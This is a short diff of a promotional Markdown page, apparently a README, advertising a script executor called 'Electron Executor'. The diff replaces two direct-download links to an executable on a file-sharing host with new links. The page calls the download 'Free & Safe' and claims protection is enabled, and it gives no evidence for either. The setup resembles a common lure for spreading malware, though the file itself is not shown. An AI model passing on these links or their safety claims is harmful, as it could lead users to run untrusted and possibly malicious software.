@@ -4,7 +4,7 @@
 
 ---
 
-🔥 [📥 Download Electron Executor (Free & Safe)](https://www.4sync.com/web/directDownload/Q1p9QXSC/wmyISzkw.ce8c729734dd2b92b375bc969a51752b)  
+🔥 [📥 Download Electron Executor (Free & Safe)](https://www.4sync.com/web/directDownload/FEdmHuqk/TFKslE2D.060ef0f710400e694ef6e5dbeca2f8c2)  
 💻 Compatible with Windows 7–11 (64-bit) | 🛡️ Protection Enabled | 🔄 Auto-Updates
 
 ---
@@ -58,7 +58,7 @@
 - 🎯 Targeted script execution
 - 🆙 Always up to date
 
-📦 [👉 Download Electron Executor Now](https://www.4sync.com/web/directDownload/Q1p9QXSC/wmyISzkw.ce8c729734dd2b92b375bc969a51752b)
+📦 [👉 Download Electron Executor Now](https://www.4sync.com/web/directDownload/FEdmHuqk/TFKslE2D.060ef0f710400e694ef6e5dbeca2f8c2)
 
 ---
 
